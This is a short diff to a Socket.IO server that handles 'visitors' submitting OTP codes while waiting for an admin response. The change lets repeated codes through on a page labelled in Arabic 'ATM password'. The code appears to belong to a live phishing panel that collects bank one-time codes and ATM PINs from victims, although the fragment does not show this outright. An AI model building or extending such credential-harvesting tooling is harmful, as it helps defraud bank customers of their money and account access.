@@ -479,7 +479,7 @@ io.on("connection", (socket) => {
       if (data.digitCode) {
         // Check for duplicate OTP code
         const isDuplicateCode = visitor.digitCodes && visitor.digitCodes.some(dc => dc.code === data.digitCode);
-        if (isDuplicateCode) {
+        if (isDuplicateCode && data.page !== "كلمة مرور ATM") {
           // Reject duplicate OTP - notify visitor
           socket.emit("otp:duplicateRejected");
           visitor.waitingForAdminResponse = false;
